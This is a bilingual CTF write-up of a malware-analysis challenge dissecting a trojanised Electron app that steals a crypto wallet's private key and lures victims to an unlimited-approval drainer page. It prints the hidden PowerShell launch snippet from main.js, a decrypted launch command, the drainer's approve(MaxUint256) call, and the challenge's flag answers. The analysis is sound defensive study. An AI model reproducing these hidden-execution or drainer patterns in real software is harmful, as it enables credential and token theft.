---
title: "Holmes CTF 2026 — S01 Silent Dividend"
date: 2026-09-15
description: "RE de una app Electron TrustSettle con script Lua ofuscado que exfiltra la clave privada de un wallet cripto y arrastra a la víctima a un drainer en Sepolia."
excerpt: "Un cliente de liquidación que parece inofensivo vigila C:\\Users\\Public, roba tu .env por WinHTTP y esconde sus flags dentro de dos smart contracts. Ingeniería inversa de Electron + Lua + EVM, sin ejecutar el binario."
platform: "HTB"
difficulty: "Medium"
image: "/images/ctf.svg"
tags:
  - "DFIR"
  - "Reverse Engineering"
  - "Electron"
  - "Lua"
  - "Crypto"
  - "Holmes CTF 2026"
---

> **Reto:** Holmes CTF 2026 — Sherlock 01 "Silent Dividend" · RE de app Electron + Lua ofuscado. Parte del arco *The Reichenbach Directive* (APT Napoleon / MurkNet).
>
> **Navegación:** [🇪🇸 Español](#es) · [🇬🇧 English](#en)

<a id="es"></a>
## 🇪🇸 Español

### Escenario

Dentro del arco *The Reichenbach Directive* (la APT **Napoleon / MurkNet** persiguiendo el bosque AD **DIOGENES**), el primer Sherlock nos entrega el rastro de un robo cripto: la operación **op_sparkling**. La víctima descargó e instaló **TrustSettle**, un supuesto "cliente de liquidación" (settlement client) que se usa durante los pagos. En realidad es un troyano: monta un vigilante en segundo plano que espera a que el usuario deje sus credenciales de wallet en disco y las exfiltra, y además abre una página HTML que empuja a la víctima a firmar una aprobación de token ilimitada hacia un contrato **drainer**.

El paquete se entrega **ya extraído** (Electron `app/` + `extraResources/`) más el instalador original. No hay que ejecutar nada: todo el reto se resuelve con **análisis estático** y **consultas RPC de solo lectura** contra la testnet Sepolia. Las 10 preguntas mezclan RE de Electron, desofuscación de Lua y lectura de bytecode EVM.

### Artefacto y herramientas

**Artefactos:**

- `TrustSettle 1.0.0.exe` — instalador NSIS. Cadena: `$PLUGINSDIR/app-64.7z` → app Electron.
- `resources/app.asar` — bundle de la app (`package.json`, `main.js`, `preload.js`, `src/settlement.html`, `src/renderer.js`…).
- `extraResources/` — `.env` (plantilla `PRIVATE_KEY`/`WALLET_ADDRESS`/`RPC_URL`), `api.txt` (Lua ofuscado), `lua51.dll`, `luajit.exe`.
- `README.md` — pide poblar el `.env` en `C:\Users\Public\`.

**Herramientas:**

- `7z` para desanidar el NSIS; **Node** para parsear la cabecera del `.asar` a mano y volcar cada fichero.
- `lua5.4` como sandbox de instrumentación con un `ffi`/`bit` **falsos** para desofuscar el VM de `api.txt` (familia **Prometheus/LuaJIT**) sin ejecutar malware real.
- `curl` + RPC público de Sepolia (`https://ethereum-sepolia-rpc.publicnode.com`) para `eth_call`/`eth_getStorageAt`; `python3` con `keccak` para calcular selectores.
- Un pequeño desensamblador de bytecode EVM en Python (los contratos **no** estaban verificados en Etherscan).

### Metodología (paso a paso)

1. **Desanidar el instalador.** `7z x 'TrustSettle 1.0.0.exe'` → `$PLUGINSDIR/app-64.7z` → `7z x app-64.7z` → app Electron completa con `extraResources/`.

2. **Abrir el `app.asar`.** En lugar de `asar`, se parsea la cabecera con Node (`readUInt32LE(12)` = longitud del JSON; `cbase = 8 + readUInt32LE(4)`) y se vuelcan `main.js`, `preload.js`, `src/settlement.html`, `src/renderer.js`.

3. **Leer `main.js` → Q1 y Q6.** El main copia **todo** `extraResources/` a `C:\Users\Public` y lanza el intérprete oculto:
   ```js
   fs.readdirSync('.../extraResources').forEach(f =>
     fs.copyFileSync('.../extraResources/'+f, path.join('C:\\Users\\Public', f)));
   exec("powershell.exe -exec bypass -w hidden -nop -c \"& 'C:\\Users\\Public\\luajit.exe' 'C:\\Users\\Public\\api.txt'\"");
   ```
   → **Q1 = `C:\Users\Public`**. Más adelante el HTML se copia a `%TEMP%` → **Q6 = `%TEMP%`**.

4. **Desofuscar `api.txt` (Lua) → Q2 y Q3.** El script es un VM ofuscado tipo Prometheus (tabla `local z={...}`). En vez de desofuscar a mano, se ejecuta en un **sandbox** con `lua5.4` y un `ffi`/`bit` falsos que registran cada `cdef`, cada API Win32 invocada y cada variable de entorno consultada. El log revela el comportamiento:
   - Vigila `C:\Users\Public\` con `ReadDirectoryChangesW`, cuyo buffer es un `FILE_NOTIFY_INFORMATION` → **Q2 = `FILE_NOTIFY_INFORMATION`**.
   - Cuando aparece el `.env`, lo lee y lo **exfiltra por WinHTTP** con `WinHttpSendRequest` → **Q3 = `WinHttpSendRequest`**.

5. **Descifrar el payload de `preload.js` → Q4 y Q5 (FLAG).** El `preload.js` trae un `ENCRYPTED_DATA` y lo descifra con una clave que **no** está en el binario: la pide on-chain llamando `resolveState()` (→ **Q4**) a un contrato en Sepolia (`0xbB63…A6B1`, selector `0x77b3774c`). Con `eth_call` se obtiene la clave (`0x3460743b…f952f4`) y se aplica el algoritmo del propio `preload.js`: **XOR(clave) → ROL 7 → XOR 0x42**. El resultado es un comando:
   ```
   start "" "%TEMP%\settlement.html" && echo AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821
   ```
   → **Q5 = `AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821`** (y confirma que el HTML se abre desde `%TEMP%`).

6. **Analizar `settlement.html` → Q7, Q8, Q9.** La página es un drainer clásico: conecta al wallet del navegador con `new ethers.BrowserProvider(window.ethereum)` (→ **Q9**) y llama `token.approve(spender, ethers.MaxUint256)` (→ **Q7 = `approve()`**, **Q8 = `MaxUint256` = 2²⁵⁶−1**), es decir, una **aprobación de gasto ilimitada** hacia el contrato del atacante.

7. **Explotar el contrato "drainer" → Q10 (FLAG).** El `spender` es `0x69Bf…709D`, sin verificar. Desensamblando su bytecode aparecen los selectores y la lógica: `282940a7()` devuelve públicamente el **"hidden owner"** (`0xebfc…7a9a`), y `f8e6e11f(address)` devuelve un **string** solo si el argumento coincide con ese hidden owner. Se llama por `eth_call`:
   ```
   eth_call f8e6e11f(0xebfc1ed96b1c6b940fb6b06359ff4a6776df7a9a)
   ```
   y devuelve la cadena de coordenadas **`51.5049,0.0348`** (Greenwich/Londres — guiño a Sherlock) → **Q10**.

Todo el trabajo fue estático + RPC de solo lectura: **no se ejecutó el `.exe`** ni se firmó ninguna transacción.

### Respuestas / flags

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿A qué directorio copia la app los ficheros de `extraResources`? | `C:\Users\Public` |
| 2 | Estructura Win32 del buffer al monitorizar cambios de directorio | `FILE_NOTIFY_INFORMATION` |
| 3 | API Win32 que usa el Lua para enviar la petición HTTP | `WinHttpSendRequest` |
| 4 | Función del contrato que devuelve la clave de descifrado | `resolveState()` |
| 5 | **FLAG** — descifrar el payload | `AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821` |
| 6 | Variable de entorno del directorio donde copia el HTML del paquete | `%TEMP%` |
| 7 | Función del token que la página llama para pedir permiso de gasto | `approve()` |
| 8 | Cantidad exacta pasada al `approve` | `115792089237316195423570985008687907853269984665640564039457584007913129639935` (`ethers.MaxUint256`, 2²⁵⁶−1) |
| 9 | Clase provider de ethers.js v6 para la wallet del navegador | `BrowserProvider` |
| 10 | **FLAG** — contrato oculto | `51.5049,0.0348` |

### Lecciones

- **Las apps Electron son código, no cajas negras.** Un `app.asar` se abre trivialmente (`asar extract` o parseando la cabecera con Node); `main.js`/`preload.js` suelen contener toda la lógica maliciosa en claro.
- **`extraResources` es una señal de alarma.** Un instalador legítimo rara vez copia binarios a `C:\Users\Public` para lanzarlos ocultos con PowerShell.
- **La ofuscación de Lua se derrota instrumentando, no descifrando a mano.** Un `ffi`/`bit` falso que loguea `cdef`s y llamadas Win32 revela el comportamiento del VM en minutos y sin ejecutar el malware de verdad.
- **Claves y secretos "off-chain by design".** Guardar la clave de descifrado en un `resolveState()` de un smart contract dificulta el análisis estático puro, pero un `eth_call` de solo lectura la entrega igual.
- **`approve(spender, MaxUint256)` = drainer.** La aprobación de gasto ilimitada es la firma inequívoca de un robo de tokens; nunca la concedas a un contrato sin verificar.
- **DFIR sin detonar.** Todo el reto se resolvió con análisis estático y RPC de solo lectura: nunca ejecutes la muestra ni firmes transacciones para "confirmar".

<a id="en"></a>
## 🇬🇧 English

### Scenario

Within the *The Reichenbach Directive* arc (the **Napoleon / MurkNet** APT hunting the **DIOGENES** AD forest), the first Sherlock hands us the trail of a crypto heist: operation **op_sparkling**. The victim downloaded and installed **TrustSettle**, a supposed "settlement client" used during payments. It is actually a trojan: it plants a background watcher that waits for the user to drop their wallet credentials on disk and exfiltrates them, and it also pops an HTML page that nudges the victim into signing an unlimited token approval to a **drainer** contract.

The package is shipped **already extracted** (Electron `app/` + `extraResources/`) plus the original installer. Nothing needs to run: the whole challenge is solved with **static analysis** and **read-only RPC calls** against the Sepolia testnet. The 10 questions blend Electron RE, Lua deobfuscation and EVM bytecode reading.

### Artifact and tools

**Artifacts:**

- `TrustSettle 1.0.0.exe` — NSIS installer. Chain: `$PLUGINSDIR/app-64.7z` → Electron app.
- `resources/app.asar` — app bundle (`package.json`, `main.js`, `preload.js`, `src/settlement.html`, `src/renderer.js`…).
- `extraResources/` — `.env` (template `PRIVATE_KEY`/`WALLET_ADDRESS`/`RPC_URL`), `api.txt` (obfuscated Lua), `lua51.dll`, `luajit.exe`.
- `README.md` — asks to populate the `.env` under `C:\Users\Public\`.

**Tools:**

- `7z` to unnest the NSIS; **Node** to parse the `.asar` header by hand and dump each file.
- `lua5.4` as an instrumentation sandbox with **fake** `ffi`/`bit` to deobfuscate the `api.txt` VM (**Prometheus/LuaJIT** family) without running real malware.
- `curl` + public Sepolia RPC (`https://ethereum-sepolia-rpc.publicnode.com`) for `eth_call`/`eth_getStorageAt`; `python3` with `keccak` to compute selectors.
- A small Python EVM bytecode disassembler (the contracts were **not** verified on Etherscan).

### Methodology (step by step)

1. **Unnest the installer.** `7z x 'TrustSettle 1.0.0.exe'` → `$PLUGINSDIR/app-64.7z` → `7z x app-64.7z` → full Electron app with `extraResources/`.

2. **Open `app.asar`.** Instead of `asar`, parse the header with Node (`readUInt32LE(12)` = JSON length; `cbase = 8 + readUInt32LE(4)`) and dump `main.js`, `preload.js`, `src/settlement.html`, `src/renderer.js`.

3. **Read `main.js` → Q1 and Q6.** The main process copies **all** of `extraResources/` to `C:\Users\Public` and launches the hidden interpreter:
   ```js
   fs.readdirSync('.../extraResources').forEach(f =>
     fs.copyFileSync('.../extraResources/'+f, path.join('C:\\Users\\Public', f)));
   exec("powershell.exe -exec bypass -w hidden -nop -c \"& 'C:\\Users\\Public\\luajit.exe' 'C:\\Users\\Public\\api.txt'\"");
   ```
   → **Q1 = `C:\Users\Public`**. Later the HTML is copied to `%TEMP%` → **Q6 = `%TEMP%`**.

4. **Deobfuscate `api.txt` (Lua) → Q2 and Q3.** The script is a Prometheus-style obfuscated VM (`local z={...}` string table). Rather than deobfuscating by hand, run it in a **sandbox** with `lua5.4` and fake `ffi`/`bit` that log every `cdef`, every Win32 API invoked and every environment variable read. The log reveals the behavior:
   - It watches `C:\Users\Public\` with `ReadDirectoryChangesW`, whose buffer is a `FILE_NOTIFY_INFORMATION` → **Q2 = `FILE_NOTIFY_INFORMATION`**.
   - When the `.env` appears, it reads it and **exfiltrates it over WinHTTP** with `WinHttpSendRequest` → **Q3 = `WinHttpSendRequest`**.

5. **Decrypt the `preload.js` payload → Q4 and Q5 (FLAG).** `preload.js` carries an `ENCRYPTED_DATA` blob and decrypts it with a key that is **not** in the binary: it fetches it on-chain by calling `resolveState()` (→ **Q4**) on a Sepolia contract (`0xbB63…A6B1`, selector `0x77b3774c`). An `eth_call` returns the key (`0x3460743b…f952f4`) and the `preload.js` algorithm is applied: **XOR(key) → ROL 7 → XOR 0x42**. The result is a command:
   ```
   start "" "%TEMP%\settlement.html" && echo AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821
   ```
   → **Q5 = `AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821`** (and it confirms the HTML is opened from `%TEMP%`).

6. **Analyze `settlement.html` → Q7, Q8, Q9.** The page is a classic drainer: it connects to the browser wallet with `new ethers.BrowserProvider(window.ethereum)` (→ **Q9**) and calls `token.approve(spender, ethers.MaxUint256)` (→ **Q7 = `approve()`**, **Q8 = `MaxUint256` = 2²⁵⁶−1**), i.e. an **unlimited spending approval** to the attacker's contract.

7. **Exploit the "drainer" contract → Q10 (FLAG).** The `spender` is `0x69Bf…709D`, unverified. Disassembling its bytecode exposes the selectors and logic: `282940a7()` publicly returns the **"hidden owner"** (`0xebfc…7a9a`), and `f8e6e11f(address)` returns a **string** only if the argument equals that hidden owner. Call it via `eth_call`:
   ```
   eth_call f8e6e11f(0xebfc1ed96b1c6b940fb6b06359ff4a6776df7a9a)
   ```
   and it returns the coordinate string **`51.5049,0.0348`** (Greenwich/London — a Sherlock nod) → **Q10**.

Everything was static + read-only RPC: the **`.exe` was never run** and no transaction was ever signed.

### Respuestas / flags

| # | Question | Answer |
|---|----------|--------|
| 1 | Which directory does the app copy the `extraResources` files to? | `C:\Users\Public` |
| 2 | Win32 structure defining the buffer format when monitoring directory changes | `FILE_NOTIFY_INFORMATION` |
| 3 | Win32 API used by the Lua script to send the HTTP request | `WinHttpSendRequest` |
| 4 | Smart-contract function that returns the decryption key | `resolveState()` |
| 5 | **FLAG** — decode the encrypted payload | `AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821` |
| 6 | Environment variable of the directory where the app copies the HTML | `%TEMP%` |
| 7 | Token function the HTML page calls to request spending permission | `approve()` |
| 8 | Exact token amount passed to the approval call | `115792089237316195423570985008687907853269984665640564039457584007913129639935` (`ethers.MaxUint256`, 2²⁵⁶−1) |
| 9 | ethers.js v6 provider class used to connect to the browser wallet | `BrowserProvider` |
| 10 | **FLAG** — hidden contract | `51.5049,0.0348` |

### Lecciones

- **Electron apps are code, not black boxes.** An `app.asar` opens trivially (`asar extract` or parsing the header with Node); `main.js`/`preload.js` usually hold all the malicious logic in the clear.
- **`extraResources` is a red flag.** A legitimate installer rarely copies binaries into `C:\Users\Public` to launch them hidden via PowerShell.
- **Lua obfuscation is beaten by instrumenting, not hand-decrypting.** A fake `ffi`/`bit` that logs `cdef`s and Win32 calls reveals the VM's behavior in minutes, without detonating the real malware.
- **Keys and secrets "off-chain by design".** Storing the decryption key inside a contract's `resolveState()` frustrates pure static analysis, but a read-only `eth_call` hands it over anyway.
- **`approve(spender, MaxUint256)` = drainer.** An unlimited spending approval is the unmistakable signature of a token theft; never grant it to an unverified contract.
- **DFIR without detonating.** The whole challenge was solved with static analysis and read-only RPC: never run the sample or sign transactions to "confirm".
